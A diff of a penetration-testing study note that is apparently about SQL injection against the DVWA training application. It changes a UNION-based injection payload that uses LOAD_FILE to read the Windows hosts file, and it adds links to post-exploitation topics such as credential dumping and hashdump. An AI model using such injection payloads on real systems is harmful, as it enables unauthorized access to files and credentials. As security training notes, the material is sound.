@@ -92,7 +92,7 @@ Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa
 - DNS resolve and nameserver IPs
 
 ```sql
-' UNION SELECT NULL, LOAD_FILE('c:/WINDOWS/system32/drivers/etc/hosts')#
+' UNION SELECT NULL, LOAD_FILE('c:/Windows/system32/drivers/etc/hosts')#
 ```
 
 ## 3.3 - Credentials
@@ -176,4 +176,32 @@ Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa
 ---
 ## References
 
-- [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Enumeration and Discovery/Windows/Host/Networking/IP Address|Enumeration and Discovery: IP Address]]
+### Linux
+
+#### Enumeration and Discovery
+
+- [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Enumeration and Discovery/Linux/Users|Users]]
+
+- [[Environment Variables]]
+
+- [[Log Files]]
+
+- [[System and Kernel Version]]
+
+#### Enumeration and Discovery
+
+- [[Cron Job]]
+
+#### Credentials Access and Dumping
+
+- [[Credentials]]
+
+### Windows
+
+#### Enumeration and Discovery
+
+- [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Enumeration and Discovery/Windows/Host/Networking/IP Address|IP Addresses]]
+
+#### Privilege Escalation
+
+- [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Credential Access and Dumping/Windows/Host/Registry/Hashdump/01 - Manual|Manual Hashdump]]
